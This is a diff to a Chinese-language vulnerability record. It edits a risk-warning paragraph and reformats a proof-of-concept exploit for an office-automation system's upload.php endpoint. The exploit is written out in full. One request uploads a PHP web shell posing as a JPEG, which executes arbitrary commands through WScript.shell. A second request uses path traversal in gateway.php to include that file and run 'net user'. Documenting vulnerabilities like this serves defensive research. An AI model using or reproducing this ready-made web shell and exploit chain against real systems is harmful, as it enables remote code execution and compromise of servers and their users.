@@ -41,7 +41,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -141,53 +141,53 @@ V11版2017版2016版2015版2013增强版2013版
 #### 请求包
 
 ```http
-    POST /ispirit/im/upload.php HTTP/1.1
-    Host: 10.10.20.116:88
-    Content-Length: 658
-    Cache-Control: no-cache
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
-    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
-    Accept: */*
-    Accept-Encoding: gzip, deflate
-    Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
-    Cookie: PHPSESSID=123
-    Connection: close
+POST /ispirit/im/upload.php HTTP/1.1
+Host: 10.10.20.116:88
+Content-Length: 658
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+Cookie: PHPSESSID=123
+Connection: close
 
-    ------WebKitFormBoundarypyfBh1YB4pV8McGB
-    Content-Disposition: form-data; name="UPLOAD_MODE"
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="UPLOAD_MODE"
 
-    2
-    ------WebKitFormBoundarypyfBh1YB4pV8McGB
-    Content-Disposition: form-data; name="P"
+2
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="P"
 
-    123
-    ------WebKitFormBoundarypyfBh1YB4pV8McGB
-    Content-Disposition: form-data; name="DEST_UID"
+123
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="DEST_UID"
 
-    1
-    ------WebKitFormBoundarypyfBh1YB4pV8McGB
-    Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
-    Content-Type: image/jpeg
+1
+------WebKitFormBoundarypyfBh1YB4pV8McGB
+Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
+Content-Type: image/jpeg
 
-    <?php
-    $command=$_POST['cmd'];
-    $wsh = new COM('WScript.shell');
-    $exec = $wsh->exec("cmd /c ".$command);
-    $stdout = $exec->StdOut();
-    $stroutput = $stdout->ReadAll();
-    echo $stroutput;
-    ?>
-    ------WebKitFormBoundarypyfBh1YB4pV8McGB--
-    POST /mac/gateway.php HTTP/1.1
-    Host: 10.10.20.116:88
-    Connection: keep-alive
-    Accept-Encoding: gzip, deflate
-    Accept: */*
-    User-Agent: python-requests/2.21.0
-    Content-Length: 71
-    Content-Type: application/x-www-form-urlencoded
+<?php
+$command=$_POST['cmd'];
+$wsh = new COM('WScript.shell');
+$exec = $wsh->exec("cmd /c ".$command);
+$stdout = $exec->StdOut();
+$stroutput = $stdout->ReadAll();
+echo $stroutput;
+?>
+------WebKitFormBoundarypyfBh1YB4pV8McGB--
+POST /mac/gateway.php HTTP/1.1
+Host: 10.10.20.116:88
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.21.0
+Content-Length: 71
+Content-Type: application/x-www-form-urlencoded
 
-    json={"url":"/general/../../attach/im/2003/938379153.jpg"}&cmd=net user
+json={"url":"/general/../../attach/im/2003/938379153.jpg"}&cmd=net user
 ```
 
 
